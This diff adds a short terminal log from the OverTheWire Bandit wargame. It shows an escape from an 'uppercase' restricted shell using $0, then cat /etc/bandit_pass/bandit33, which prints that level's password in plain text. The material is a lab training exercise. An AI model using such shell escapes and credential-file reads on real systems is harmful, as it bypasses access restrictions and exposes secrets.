@@ -1,0 +1,22 @@
+>> ^Csuraj@bitforestinfo:~$ ssh bandit32@bandit.labs.overthewire.org -p 2220 /bin/bash
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit32@bandit.labs.overthewire.org's password: 
+
+WELCOME TO THE UPPERCASE SHELL
+>> >> 
+>> >> shell
+>> sh: 1: SHELL: not found
+$1
+>> $1
+>> $0
+
+sdf
+ssh: 3: sdf: not found
+adf
+sh: 4: sadf: not found
+ls
+uppershell
+cat /etc/bandit_pass/bandit33
+c9c3199ddf4121b10cf581a98d51caee
+
